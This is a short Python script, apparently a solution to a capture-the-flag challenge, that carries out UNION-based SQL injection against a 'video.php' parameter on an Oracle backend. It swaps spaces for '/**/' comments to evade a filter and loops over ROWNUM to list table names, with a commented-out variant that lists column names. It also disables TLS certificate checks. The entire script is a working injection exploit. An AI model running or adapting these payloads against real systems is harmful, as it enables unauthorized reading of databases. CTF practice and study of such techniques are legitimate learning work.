import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,table_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,table_name/**/FROM/**/user_tables/**/ORDER/**/BY/**/table_name)/**/where/**/r=' # find secret table 
# url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,column_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,column_name/**/FROM/**/user_tab_columns/**/ORDER/**/BY/**/column_name)/**/where/**/r=' # find secret column

for row_num in range(1, 1000):

    url2 = url + str(row_num)
    result = requests.get(url2, verify=False)

    if 'Error' not in result.text and 'Bad cat!' not in result.text:
        splittext = result.text.splitlines()
        for each_row in splittext:
            if '<h2>' in each_row:
                print(each_row, '\t --> row_num %d '%(row_num))
